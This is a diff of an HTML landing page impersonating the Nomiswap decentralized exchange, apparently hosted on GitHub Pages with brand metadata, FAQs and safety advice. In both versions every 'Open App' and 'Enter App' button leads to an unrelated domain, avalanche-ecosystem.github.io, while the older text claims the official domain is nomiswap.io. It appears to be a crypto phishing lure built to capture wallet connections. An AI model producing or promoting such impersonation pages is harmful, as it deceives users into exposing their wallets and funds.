@@ -1,47 +1,113 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Nomiswap DEX - Open App</title><meta name="description" content="nomiswap dex opens the official Nomiswap swap interface for BNB Smart Chain tokens, wallet connection, route review, and on-chain execution.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://nomiswap-dex.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Nomiswap DEX - Open App"><meta property="og:description" content="nomiswap dex opens the official Nomiswap swap interface for BNB Smart Chain tokens, wallet connection, route review, and on-chain execution.">
-<meta property="og:url" content="https://nomiswap-dex.github.io/"><meta property="og:image" content="https://nomiswap-dex.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Nomiswap DEX - Open App"><meta name="twitter:description" content="nomiswap dex opens the official Nomiswap swap interface for BNB Smart Chain tokens, wallet connection, route review, and on-chain execution."><meta name="twitter:image" content="https://nomiswap-dex.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://nomiswap-dex.github.io/#website","url":"https://nomiswap-dex.github.io/","name":"Nomiswap"},{"@type":"WebPage","@id":"https://nomiswap-dex.github.io/#webpage","url":"https://nomiswap-dex.github.io/","name":"Nomiswap DEX - Open App","description":"nomiswap dex opens the official Nomiswap swap interface for BNB Smart Chain tokens, wallet connection, route review, and on-chain execution.","inLanguage":"en","isPartOf":{"@id":"https://nomiswap-dex.github.io/#website"}},{"@type":"Organization","@id":"https://nomiswap-dex.github.io/#org","name":"Nomiswap","url":"https://nomiswap-dex.github.io/","logo":"https://nomiswap-dex.github.io/og-cover.png","sameAs":["https://twitter.com/NominexExchange","https://github.com/nominex","https://defillama.com/protocol/nomiswap"]},{"@type":"WebApplication","@id":"https://nomiswap-dex.github.io/#app","name":"Nomiswap DEX","url":"https://nomiswap-dex.github.io/","applicationCategory":"FinanceApplication","operatingSystem":"Web","browserRequirements":"Requires JavaScript","description":"nomiswap dex opens the official Nomiswap swap interface for BNB Smart Chain tokens, wallet connection, route review, and on-chain execution.","featureList":["Official domain: nomiswap.io","Wallet-based access","On-chain swaps"],"isPartOf":{"@id":"https://nomiswap-dex.github.io/#website"}},{"@type":"FAQPage","@id":"https://nomiswap-dex.github.io/#faq","inLanguage":"en","mainEntity":[{"@type":"Question","name":"What chain is Nomiswap on?","acceptedAnswer":{"@type":"Answer","text":"Nomiswap is primarily tracked on BNB Smart Chain; the BNB Chain overview describes BNB Smart Chain as EVM-compatible, and DeFiLlama reports Nomiswap activity on BSC. Users need BNB for gas and should verify that the token they are swapping is the correct BEP-20 contract."}},{"@type":"Question","name":"What is the NMX token?","acceptedAnswer":{"@type":"Answer","text":"NMX is Nomiswap's protocol token. CoinGecko's Nominex page tracks NMX market data, while ecosystem rewards, staking, and liquidity conditions can change with emissions, market demand, and pool depth."}},{"@type":"Question","name":"Is Nomiswap bigger than PancakeSwap?","acceptedAnswer":{"@type":"Answer","text":"No. CoinMarketCap's PancakeSwap page and PancakeSwap's pool documentation provide a broader reference point for CAKE and PancakeSwap liquidity, while Nomiswap is a smaller DEX with its own referral and NMX reward design. Traders should compare live route output, and LPs should compare pool depth, volume, rewards, and risk."}},{"@type":"Question","name":"Can I farm on Nomiswap?","acceptedAnswer":{"@type":"Answer","text":"Nomiswap has offered farming and staking-style features tied to liquidity positions and NMX rewards. arXiv impermanent loss research is a useful reference for how LP positions can differ from simply holding the underlying assets; farming can expose users to impermanent loss and reward-token volatility. Always check current pool rules in the official app before depositing."}},{"@type":"Question","name":"Why is my Nomiswap swap showing high slippage?","acceptedAnswer":{"@type":"Answer","text":"High slippage usually means the pool is shallow for the trade size, the token is volatile, or the route has poor liquidity. Investopedia's slippage definition explains why execution can differ from an expected quote; reducing trade size, choosing a deeper pair, or comparing venues may improve execution."}},{"@type":"Question","name":"Where can I track Nomiswap TVL?","acceptedAnswer":{"@type":"Answer","text":"Nomiswap TVL and protocol information can be checked on DeFiLlama. The DeFiLlama listing shows current TVL, BSC chain data, staked value, category, and competitors; for actual trading and pool details, users still need the official Nomiswap app."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Nomiswap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Nomiswap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App â†—</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Nomiswap DEX</h1>
-      <div class="bridge-widget" role="group" aria-label="Nomiswap preview"><div class="bw-field"><span class="bw-coin"><img src="static/bnb.png" alt="BNB" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>BNB</b> Â· BNB Smart Chain</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin mono">NMX</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>NMX</b> Â· BNB Smart Chain</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App â†—</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Nomiswap â†—</a></div>
-      <p class="hero-note">Live preview â€” open the official Nomiswap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official domain: nomiswap.io</span><span class="trust-chip">Wallet-based access</span><span class="trust-chip">On-chain swaps</span></div>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Nomiswap DEX</title>
+  <meta name="description" content="Nomiswap DEX is a decentralized exchange for swapping tokens on BNB Chain from your own wallet.">
+  <link rel="canonical" href="https://nomiswap-dex.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F8F5">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Nomiswap DEX">
+  <meta property="og:description" content="Nomiswap DEX is a decentralized exchange for swapping tokens on BNB Chain from your own wallet.">
+  <meta property="og:url" content="https://nomiswap-dex.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Nomiswap DEX">
+  <meta name="twitter:description" content="Nomiswap DEX is a decentralized exchange for swapping tokens on BNB Chain from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://nomiswap-dex.github.io/#website",
+        "url": "https://nomiswap-dex.github.io/",
+        "name": "Nomiswap DEX",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://nomiswap-dex.github.io/#app",
+        "name": "Nomiswap DEX",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://nomiswap-dex.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://nomiswap-dex.github.io/#organization",
+        "name": "Nomiswap DEX",
+        "url": "https://nomiswap-dex.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Nomiswap DEX">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Nomiswap DEX</span>
     </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Nomiswap DEX?</h2><div class="capsule"><strong>Nomiswap</strong> is a DeFi swap interface for token trading with BNB Smart Chain support; users connect a compatible wallet, choose assets, and submit transactions through the <a class="inline-link" href="https://nomiswap.io/swap" rel="noopener noreferrer">official swap interface</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Nomiswap DEX at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Decentralized exchange</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://www.bnbchain.org/en/bnb-smart-chain" rel="noopener noreferrer">BNB Smart Chain overview</a></b></div><div class="f"><small>Token</small><b><a class="inline-link" href="https://bscscan.com/token/0xd32d01a43c869edcd1117c640fbdcfcfd97d9d65" rel="noopener noreferrer">NMX BEP-20 contract</a></b></div><div class="f"><small>Custody</small><b>Non-custodial AMM smart contracts</b></div><div class="f"><small>Model</small><b>AMM with referral and staking features</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Nomiswap DEX fees and NMX rewards</h2><div class="intent-a">Nomiswap is a BNB Smart Chain decentralized exchange with AMM swaps, NMX token mechanics, staking, farming, and a referral-oriented growth model. <a class="inline-link" href="https://defillama.com/protocol/nomiswap" rel="noopener noreferrer">DeFiLlama's Nomiswap profile</a> describes it as a DEX platform with a binary referral system and low platform transaction fees. Users searching fees should separate swap fees, <a class="inline-link" href="https://www.binance.com/en/academy/articles/what-are-liquidity-pools-in-defi" rel="noopener noreferrer">liquidity-pool mechanics</a>, price impact, gas fees on BSC, and any NMX reward or cashback mechanics shown in the app. The final swap quote is more important than a marketing fee headline because output depends on pool liquidity and trade size.</div></div></section><section class="section"><div class="container"><h2>Nomiswap supported chain and tokens</h2><div class="intent-a">Nomiswap's core tracked activity is on BNB Smart Chain, where users trade BEP-20 assets through AMM pools. NMX is the protocol token associated with the exchange, while BNB is commonly needed for gas. Supported tokens are determined by app listings, pool creation, liquidity depth, and token contract verification. As with any BSC DEX, users should verify token contracts on a block explorer such as <a class="inline-link" href="https://bscscan.com/" rel="noopener noreferrer">BscScan's BNB Smart Chain explorer</a> before swapping because fake tokens can share the same ticker and logo. A low-liquidity token may technically be swappable but can still produce poor execution; the <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 token interface</a> shows why token standards do not guarantee liquidity or safety.</div></div></section><section class="section section-alt"><div class="container"><h2>Nomiswap staking, farming, and referral program</h2><div class="intent-a">Nomiswap-related search demand often includes staking NMX, farming LP tokens, and referral levels. These features can increase apparent returns, but they also add token-price, emissions, lockup, and smart contract risk. A user should distinguish single-token staking from LP farming, because <a class="inline-link" href="https://www.binance.com/en/academy/articles/what-are-liquidity-pools-in-defi" rel="noopener noreferrer">liquidity provider deposits</a> behave differently from simply holding a token. Referral rewards are not the same as trading yield; they depend on user activity and program rules. For any advertised APR, compare it with <a class="inline-link" href="https://www.coingecko.com/en/coins/nominex" rel="noopener noreferrer">NMX market data</a>, the reward asset, and the pool's volume before deciding whether the risk is acceptable.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Nomiswap DEX</h2><ol class="steps"><li><b>Open the app</b><span>Go to nomiswap.io/swap and confirm the domain before connecting a wallet.</span></li><li><b>Connect a wallet</b><span>Use a compatible BNB Smart Chain wallet; <a class="inline-link" href="https://support.metamask.io/configure/networks/how-to-add-a-custom-network-rpc/" rel="noopener noreferrer">MetaMask's custom network guide</a> shows the kind of RPC details wallets may require.</span></li><li><b>Set the swap</b><span>Choose tokens, review the route, price impact, slippage, and network gas before submitting.</span></li><li><b>Confirm on-chain</b><span>Sign the transaction in your wallet, then use <a class="inline-link" href="https://ethereum.org/developers/docs/transactions/" rel="noopener noreferrer">transaction lifecycle documentation</a> to understand what a signed transaction sends to the network.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Nomiswap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Nomiswap â†—</a></div></div></section>
-  <section class="section"><div class="container"><h2>Nomiswap vs PancakeSwap</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Nomiswap</th><th>PancakeSwap</th></tr></thead><tbody><tr><td>Network focus</td><td>BNB Smart Chain</td><td>BNB Chain and multiple chains</td></tr><tr><td>Token</td><td>NMX</td><td><a class="inline-link" href="https://coinmarketcap.com/currencies/pancakeswap/" rel="noopener noreferrer">CAKE market page</a></td></tr><tr><td>Positioning</td><td>Low-fee DEX with referral and rewards mechanics</td><td>Largest BNB Chain AMM ecosystem</td></tr><tr><td>Liquidity profile</td><td>Smaller, niche pools</td><td><a class="inline-link" href="https://docs.pancakeswap.finance/earn/pancakeswap-pools" rel="noopener noreferrer">PancakeSwap pool documentation</a></td></tr><tr><td>Best fit</td><td>NMX users and reward-focused LPs</td><td>Mainstream BNB Chain swaps and large trades</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="facts"><div class="f"><small>Fees</small><b><a class="inline-link" href="https://ethereum.org/developers/docs/gas/" rel="noopener noreferrer">gas fee mechanics</a></b><span>Network fees and swap output can change before signing; on-chain actions are irreversible, and this is not financial advice.</span></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/d/decentralized-exchange-dex.asp" rel="noopener noreferrer">DEX custody model</a></b><span>Use your own wallet and never enter a seed phrase into a website; on-chain actions are irreversible, and this is not financial advice.</span></div><div class="f"><small>Security</small><b><a class="inline-link" href="https://support.metamask.io/stay-safe/safety-in-web3/basic-safety-and-security-tips-for-metamask/" rel="noopener noreferrer">wallet security tips</a></b><span>Check domains, contracts, and wallet prompts before signing; on-chain actions are irreversible, and this is not financial advice.</span></div></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Nomiswap DEX FAQ</h2><div class="faq-list"><details open><summary><h3>What chain is Nomiswap on?</h3></summary><div>Nomiswap is primarily tracked on BNB Smart Chain; the <a class="inline-link" href="https://www.bnbchain.org/en/bnb-smart-chain" rel="noopener noreferrer">BNB Chain overview</a> describes BNB Smart Chain as EVM-compatible, and DeFiLlama reports Nomiswap activity on BSC. Users need BNB for gas and should verify that the token they are swapping is the correct BEP-20 contract.</div></details><details><summary><h3>What is the NMX token?</h3></summary><div>NMX is Nomiswap's protocol token. <a class="inline-link" href="https://www.coingecko.com/en/coins/nominex" rel="noopener noreferrer">CoinGecko's Nominex page</a> tracks NMX market data, while ecosystem rewards, staking, and liquidity conditions can change with emissions, market demand, and pool depth.</div></details><details><summary><h3>Is Nomiswap bigger than PancakeSwap?</h3></summary><div>No. <a class="inline-link" href="https://coinmarketcap.com/currencies/pancakeswap/" rel="noopener noreferrer">CoinMarketCap's PancakeSwap page</a> and <a class="inline-link" href="https://docs.pancakeswap.finance/earn/pancakeswap-pools" rel="noopener noreferrer">PancakeSwap's pool documentation</a> provide a broader reference point for CAKE and PancakeSwap liquidity, while Nomiswap is a smaller DEX with its own referral and NMX reward design. Traders should compare live route output, and LPs should compare pool depth, volume, rewards, and risk.</div></details><details><summary><h3>Can I farm on Nomiswap?</h3></summary><div>Nomiswap has offered farming and staking-style features tied to liquidity positions and NMX rewards. <a class="inline-link" href="https://arxiv.org/abs/2106.14404" rel="noopener noreferrer">arXiv impermanent loss research</a> is a useful reference for how LP positions can differ from simply holding the underlying assets; farming can expose users to impermanent loss and reward-token volatility. Always check current pool rules in the official app before depositing.</div></details><details><summary><h3>Why is my Nomiswap swap showing high slippage?</h3></summary><div>High slippage usually means the pool is shallow for the trade size, the token is volatile, or the route has poor liquidity. <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">Investopedia's slippage definition</a> explains why execution can differ from an expected quote; reducing trade size, choosing a deeper pair, or comparing venues may improve execution.</div></details><details><summary><h3>Where can I track Nomiswap TVL?</h3></summary><div>Nomiswap TVL and protocol information can be checked on <a class="inline-link" href="https://defillama.com/protocol/nomiswap" rel="noopener noreferrer">DeFiLlama's Nomiswap listing</a>. The listing shows current TVL, BSC chain data, staked value, category, and competitors; for actual trading and pool details, users still need the official Nomiswap app.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">This page is not the official app; verify nomiswap.io before connecting, and treat all content as educational, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top â†‘</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://bscscan.com/" target="_blank" rel="nofollow noopener noreferrer">BscScan</a>
+      <a href="https://www.bnbchain.org/en" target="_blank" rel="nofollow noopener noreferrer">BNB Chain</a>
+      <a href="https://ethereum.org/en/wallets/" target="_blank" rel="nofollow noopener noreferrer">Wallets</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Nomiswap DEX">
+      <h1>Nomiswap DEX</h1>
+      <p class="sub"><strong>Nomiswap DEX</strong> is a decentralized exchange for swapping tokens on BNB Chain from your own wallet.</p>
+    </section>
+
+    <section class="swap-card" aria-label="Swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="token" src="bnb.png" width="28" height="28" alt="BNB">
+            <span class="ticker">BNB</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="token" src="usdt.png" width="28" height="28" alt="USDT">
+            <span class="ticker">USDT</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="foot">Nomiswap DEX &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length !== 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
